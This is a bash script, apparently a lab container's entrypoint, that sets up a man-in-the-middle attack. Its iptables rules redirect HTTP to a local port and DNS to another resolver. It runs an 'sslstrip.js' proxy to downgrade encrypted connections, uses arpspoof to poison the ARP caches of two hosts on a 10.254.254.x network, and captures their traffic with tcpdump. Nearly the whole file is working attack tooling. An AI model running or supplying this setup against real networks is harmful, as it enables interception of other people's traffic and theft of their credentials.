#!/bin/bash

echo "I'm alive"

# redirect HTTP requests 
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
# redirect DNS requests
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 1.1.1.1:53
iptables -t nat -A POSTROUTING -j MASQUERADE

if [ $# -gt 0 ];then
  exec "$@"
else
  tmux start-server
  tmux new-session -d -s panel -n initial -d "/usr/bin/env sh -c \"echo 'reverse proxy'\"; /usr/bin/env sh -c \"/usr/local/node/bin/node /root/sslstrip.js\""
  tmux split-window -t panel:0 "/usr/bin/env sh -c \"echo 'arpspoof'\"; /usr/bin/env sh -c \"arpspoof -i eth0 -t 10.254.254.100 10.254.254.254 & arpspoof -i eth0 -t 10.254.254.254 10.254.254.100\""
  tmux split-window -t panel:0 "/usr/bin/env sh -c \"echo 'tcpdump'\"; /usr/bin/env sh -c \"tcpdump -n -i eth0 ip\""
  tmux split-window -t panel:0 "/usr/bin/env sh -c \"echo 'shell'\"; /usr/bin/env sh -c \"/bin/bash\""

  # change layout to tiled
  tmux select-layout -t panel:0 tiled

  tmux set -g status off
  tmux attach -t panel
fi
